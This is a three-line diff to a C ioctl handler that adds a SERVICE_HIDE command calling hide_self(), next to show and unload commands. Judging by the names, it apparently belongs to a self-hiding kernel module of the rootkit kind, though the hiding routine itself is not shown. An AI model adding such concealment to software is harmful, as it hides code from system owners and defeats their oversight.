@@ -21,6 +21,9 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
         case SERVICE_SHOW:
             show_self();
             break;
+        case SERVICE_HIDE:
+            hide_self();
+            break;
         case SERVICE_UNLOAD:
             show_self();
             unload_self();
